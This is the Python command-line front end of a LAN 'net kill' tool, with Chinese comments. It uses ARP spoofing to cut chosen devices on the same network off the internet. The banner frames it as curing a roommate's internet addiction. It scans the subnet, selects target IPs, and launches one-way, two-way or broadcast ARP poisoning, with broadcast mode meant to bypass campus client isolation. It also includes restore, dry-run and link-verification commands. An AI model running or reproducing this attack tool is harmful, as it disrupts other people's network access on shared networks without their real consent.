# -*- coding: utf-8 -*-
"""
NetKill —— 局域网断网工具（结合 scrcpy/定时/一键操作）

用法：
  python netkill.py adapters                         # 列出网卡
  python netkill.py scan                             # 扫描同网段在线设备（只发ARP请求，不改任何表）
  python netkill.py kill 192.168.1.23                # 一键让该 IP 断网（Ctrl+C 自动恢复）
  python netkill.py kill 192.168.1.23 --duration 3600 # 断网 1 小时后自动恢复
  python netkill.py kill 192.168.1.23 --forward      # 不彻底断，改成限速转发
  python netkill.py restore 192.168.1.23             # 只恢复某台设备
  python netkill.py gui                              # 图形界面（推荐）
  python netkill.py selftest                         # 干跑自检：验证保护逻辑，不发毒化包
"""
from __future__ import annotations

import argparse
import ipaddress
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

from core.arpnet import (  # noqa: E402
    ArpKiller,
    NetError,
    _norm_mac,
    can_send_packets,
    disable_ip_forward,
    enable_ip_forward,
    is_admin,
    list_adapters,
    resolve_adapter,
    require_admin,
)

RESET = "\033[0m"
C = {
    "g": "\033[92m", "y": "\033[93m", "r": "\033[91m",
    "c": "\033[96m", "b": "\033[1m", "d": "\033[90m",
}


def _c(color: str, text: str) -> str:
    if os.name == "nt":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleMode(
                ctypes.windll.kernel32.GetStdHandle(-11), 7
            )
        except Exception:
            pass
    return f"{C.get(color, '')}{text}{RESET}"


BANNER = r"""
  _   _      _  ___ _ _
 | \ | | ___| ||_ _| | | __
 |  \| |/ -_)  _|| | | |/ _|   NetKill v1.0
 |_|\__|\___|\__|___|_|_|\__|   室友戒网瘾 · 辅助睡眠
"""


# --------------------------------------------------------------------------- #
def cmd_adapters(_args) -> int:
    print(BANNER)
    adapters = list_adapters()
    if not adapters:
        print(_c("r", "没有找到已连接的网卡。"))
        return 1
    for i, a in enumerate(adapters, 1):
        print(f"  {i}. {a}")
    print(_c("d", "\n用法：python netkill.py scan --iface <序号或名字>"))
    return 0


def cmd_scan(args) -> int:
    print(BANNER)
    ad = resolve_adapter(args.iface)
    print(f"网卡：{ad}")
    killer = ArpKiller(adapter=ad, gateway=args.gateway)
    killer.on_log = lambda line: print(_c("d", line))
    if args.passive:
        print(_c("y", "只读模式：读取系统邻居表，不发送任何数据包（无需管理员）。"))
        devs = killer.scan_passive()
    else:
        require_admin()
        print(_c("y", "主动模式：发送 ARP 请求探测全网段（会短暂增加网络流量）。"))
        devs = killer.scan(cidr=args.cidr, timeout=args.timeout)
    print()
    print(_c("b", f"{'#':<3}{'IP':<16}{'MAC':<19}{'名称/厂商'}"))
    print(_c("d", "-" * 64))
    for i, d in enumerate(devs, 1):
        tag = ""
        if d.ip == ad.gateway:
            tag = _c("y", "  ← 网关（不可攻击）")
        elif d.ip == ad.ip:
            tag = _c("g", "  ← 本机")
        name = d.hostname or d.vendor or "-"
        print(f"{i:<3}{d.ip:<16}{d.mac:<19}{name}{tag}")
    print(_c("d", "\n用法：python netkill.py kill <IP>（或 gui 里点选）"))
    return 0


def cmd_kill(args) -> int:
    print(BANNER)
    require_admin()
    ad = resolve_adapter(args.iface)
    use_broadcast = not args.unicast      # 校园网适配：默认广播
    killer = ArpKiller(
        adapter=ad,
        gateway=args.gateway,
        interval=args.interval,
        forward=args.forward,
        spoof_target=args.bidirectional,
        broadcast=use_broadcast,
    )
    killer.on_log = lambda line: print(_c("d", line))

    print(f"网卡：{ad}")
    print(f"自我保护：本机 {ad.ip} / 网关 {killer.gateway} 不会被攻击。")
    if args.bidirectional:
        print(_c("c", "模式：双向毒化（目标 + 网关，攻击面更大）"))
    else:
        print(_c("c", "模式：单向毒化（只改目标的 ARP 表，不碰网关，本机零影响）"))
    if use_broadcast:
        print(_c("y", "广播模式：用广播帧穿透客户端隔离（校园网默认）。"))
        print(_c("y", "注意：广播毒化会短暂影响同网段所有客户端，停止时自动广播恢复。"))
        print(_c("d", "（同一路由器/热点环境想只影响目标，可加 --unicast）"))
    for ip in args.targets:
        try:
            mac = killer.add(ip)
            print(_c("g", f"  + 目标 {ip} → {mac}"))
        except NetError as e:
            print(_c("r", f"  ! {ip}: {e}"))

    if not killer.targets:
        print(_c("r", "没有有效目标，退出。"))
        return 2

    try:
        killer.start(background=True)
        if args.duration > 0:
            print(_c("y", f"\n将断网 {args.duration} 秒，到时自动恢复。按 Ctrl+C 立即恢复。"))
            end = time.time() + args.duration
            while time.time() < end and killer.running:
                time.sleep(0.5)
        else:
            print(_c("y", "\n已开始断网。按 Ctrl+C 停止并自动恢复网络。"))
            while killer.running:
                time.sleep(0.5)
    except KeyboardInterrupt:
        print(_c("y", "\n收到 Ctrl+C，准备恢复 …"))
    finally:
        killer.stop()
        print(_c("g", f"已发送 {killer.sent} 个 ARP 包，网络已恢复。"))
    return 0


def cmd_restore(args) -> int:
    print(BANNER)
    require_admin()
    ad = resolve_adapter(args.iface)
    killer = ArpKiller(adapter=ad, gateway=args.gateway)
    killer.gateway_mac = killer._resolve(killer.gateway)
    for ip in args.targets:
        mac = killer._resolve(ip)
        if not mac:
            print(_c("y", f"{ip}: 设备离线，跳过"))
            continue
        killer._restore_one(ip, mac)
        print(_c("g", f"{ip}: 已回毒恢复（真实网关 MAC）"))
    return 0


def cmd_selftest(_args) -> int:
    """干跑：验证目标过滤/自我保护逻辑，不发送任何毒化包。"""
    print(BANNER)
    ad = resolve_adapter(_args.iface)
    print(f"网卡：{ad}")
    k = ArpKiller(adapter=ad, gateway=ad.gateway or "127.0.0.1")
    me, gw = ad.ip, k.gateway
    print(f"本机={me}  网关={gw}")
    cases = [
        ("把本机设为目标", me, "10:11:12:13:14:15", False),
        ("把网关设为目标", gw, "10:11:12:13:14:15", False),
        ("空 MAC", "192.168.1.99", "ff:ff:ff:ff:ff:ff", False),
        ("正常室友设备", "192.168.1.99", "aa:bb:cc:dd:ee:ff", True),
    ]
    bad = 0
    for name, ip, mac, should_ok in cases:
        k2 = ArpKiller(adapter=ad, gateway=gw)
        try:
            k2.add(ip, mac)
            ok = True
            err = ""
        except NetError as e:
            ok = False
            err = str(e)
        status = "PASS" if ok == should_ok else "FAIL"
        if status == "FAIL":
            bad += 1
        print(f"  [{status}] {name}: {'允许' if ok else '拒绝'}  {err}")
    print(_c("g" if bad == 0 else "r", f"\n自检结果：{'全部通过' if bad == 0 else str(bad) + ' 项失败'}"))
    print(_c("d", "本自检不发送任何 ARP 毒化包。"))
    return 0 if bad == 0 else 3


def cmd_verify(args) -> int:
    """零伤害验证：只发 ARP 请求探测收发链路，绝不发 is-at 毒化包。

    用途：确认"管理员 + Npcap + 网卡"这条发包链路真的通，
    再决定要不要正式断网。全程不改任何设备的 ARP 表。
    """
    print(BANNER)
    require_admin()
    ad = resolve_adapter(args.iface)
    print(f"网卡：{ad}")
    print(_c("c", "零伤害验证：只发 ARP 请求（who-has），不发毒化包，不改任何 ARP 表。"))
    killer = ArpKiller(adapter=ad, gateway=args.gateway)
    killer.on_log = lambda line: print(_c("d", line))
    ok = True

    # 1) 网关解析（发包能力的关键测试：向网关发 ARP 请求）
    print(f"\n[1/4] 探测网关 {killer.gateway} …")
    from scapy.all import ARP as _ARP, Ether as _Ether, srp1 as _srp1
    t0 = time.time()
    try:
        ans = _srp1(
            _Ether(dst="ff:ff:ff:ff:ff:ff") / _ARP(pdst=killer.gateway),
            iface=killer._iface(), timeout=2.0, verbose=0,
        )
    except Exception as e:
        print(_c("r", f"  ✘ 发包失败：{e}"))
        ok = False
        ans = None
    if ans is not None:
        killer.gateway_mac = ans.hwsrc
        print(_c("g", f"  ✔ 网关回包成功：{killer.gateway} 的 MAC = {ans.hwsrc}  "
                      f"（{time.time()-t0:.2f}s）"))
    elif ok:
        print(_c("r", "  ✘ 网关无回包（可能网关禁 ping/启用了 ARP 防护，或不在同一二层）"))
        ok = False

    # 2) 扫描邻居（只读，不发包）
    print("\n[2/4] 读取邻居表 …")
    try:
        devs = killer.scan_passive()
        others = [d for d in devs if d.ip not in (ad.ip, killer.gateway)]
        print(_c("g" if others else "y", f"  ✔ 邻居表 {len(devs)} 台，可攻击候选 {len(others)} 台"))
        for d in others[:5]:
            print(f"      {d.ip:<16} {d.mac}")
        # 代理 ARP / AP 隔离 判定：候选设备 MAC 是否大量等于网关 MAC
        gw_mac = _norm_mac(killer.gateway_mac or "")
        same = [d for d in others if _norm_mac(d.mac) == gw_mac]
        if others and len(same) >= max(2, len(others) * 0.6):
            print(_c("y", f"  ! 警告：{len(same)}/{len(others)} 台设备的 MAC 与网关相同 "
                          f"({gw_mac})"))
            print(_c("y", "  ! 说明是代理 ARP / 客户端隔离网络（校园网/酒店网常见），"))
            print(_c("y", "  ! 本工具在这种环境下大概率无效；请在家用路由器/手机热点下使用。"))
            ok = False
    except Exception as e:
        print(_c("y", f"  - 邻居表读取失败：{e}"))
        others = []

    # 3) dry-run：构造毒化包并校验字段（不发送）
    print("\n[3/4] dry-run 构造毒化包（不发送）…")
    fake_mac = "aa:bb:cc:dd:ee:ff"
    fake_ip = "192.168.1.99"
    try:
        p_t = killer._pkt_to_target(fake_mac, fake_ip)
        p_g = killer._pkt_to_gateway(fake_mac, fake_ip)
        checks = [
            ("目标方向 op=is-at(2)", p_t[_ARP].op == 2),
            ("目标方向 psrc=网关", p_t[_ARP].psrc == killer.gateway),
            ("目标方向 hwsrc=本机MAC", p_t[_ARP].hwsrc == ad.mac),
            ("目标方向 Ether.dst=目标MAC", p_t[_Ether].dst == fake_mac),
            ("网关方向 pdst=网关", p_g[_ARP].pdst == killer.gateway),
            ("网关方向 psrc=目标IP", p_g[_ARP].psrc == fake_ip),
        ]
        for name, good in checks:
            print(("  " + _c("g", "✔ ") if good else "  " + _c("r", "✘ ")) + name)
            ok = ok and good
    except Exception as e:
        print(_c("r", f"  ✘ 包构造失败：{e}"))
        ok = False

    # 4) 结论
    print("\n[4/4] 结论")
    if ok:
        print(_c("g", "  ✔ 发包链路正常，攻击前的所有前置条件已满足。"))
        print(_c("g", "  ✔ 现在可以正式断网：python netkill.py kill <目标IP>"))
        if not others:
            print(_c("y", "  ! 但邻居表里暂时没有候选设备，让对方先产生一点流量再扫描。"))
        return 0
    print(_c("r", "  ✘ 存在失败项，先别断网。常见原因：非管理员 / Npcap 未装 / 不在同一二层。"))
    return 3


def cmd_gui(_args) -> int:
    from gui import main as gui_main
    return gui_main()


# --------------------------------------------------------------------------- #
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="netkill",
        description="局域网 ARP 断网工具（自用，仅限本人设备/已同意的室友设备）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument("--iface", "-i", default="", help="网卡序号/名字，默认自动选择")
    p.add_argument("--gateway", "-g", default=None, help="手动指定默认网关 IP")
    sub = p.add_subparsers(dest="cmd")

    sub.add_parser("adapters", help="列出可用网卡").set_defaults(func=cmd_adapters)

    s = sub.add_parser("scan", help="扫描同网段在线设备")
    s.add_argument("--cidr", default=None, help="网段，默认本机所在 /24 或实际前缀")
    s.add_argument("--timeout", type=float, default=2.0)
    s.add_argument("--passive", action="store_true",
                   help="只读模式：读邻居表，不发包、不需要管理员")
    s.set_defaults(func=cmd_scan)

    k = sub.add_parser("kill", help="一键断网")
    k.add_argument("targets", nargs="+", help="目标 IP（可多个）")
    k.add_argument("--duration", "-t", type=int, default=0, help="断网秒数，0=一直断到 Ctrl+C")
    k.add_argument("--interval", type=float, default=0.7, help="毒化包间隔，默认 0.7s")
    k.add_argument("--forward", action="store_true", help="开启IP转发(限速模式，不彻底断)")
    k.add_argument("--bidirectional", action="store_true",
                   help="双向毒化（同时改目标与网关，默认只改目标方向）")
    k.add_argument("--broadcast", action="store_true",
                   help="广播毒化：穿透仅隔离单播的客户端隔离（校园网默认已开启）")
    k.add_argument("--unicast", action="store_true",
                   help="改用单播毒化（同一二层域/家用路由器用，避免影响同段其它设备）")
    k.set_defaults(func=cmd_kill)

    r = sub.add_parser("restore", help="恢复目标 ARP 表")
    r.add_argument("targets", nargs="+", help="目标 IP")
    r.set_defaults(func=cmd_restore)

    sub.add_parser("gui", help="打开图形界面").set_defaults(func=cmd_gui)
    v = sub.add_parser("verify", help="零伤害验证：只发 ARP 请求，验证发包链路")
    v.set_defaults(func=cmd_verify)
    st = sub.add_parser("selftest", help="干跑自检（不发毒化包）")
    st.set_defaults(func=cmd_selftest)
    return p


def main(argv=None) -> int:
    if os.name == "nt":
        os.system("")
    parser = build_parser()
    args = parser.parse_args(argv)
    if not getattr(args, "cmd", None):
        parser.print_help()
        return 0
    if getattr(args, "cmd", "") != "gui" and not can_send_packets():
        print(_c("r", "⚠ 当前无法发包（Npcap 限制为仅管理员），请以管理员身份运行。"))
    try:
        return args.func(args)
    except NetError as e:
        print(_c("r", f"错误：{e}"))
        return 2
    except KeyboardInterrupt:
        print(_c("y", "\n已取消。"))
        return 130


if __name__ == "__main__":
    sys.exit(main())
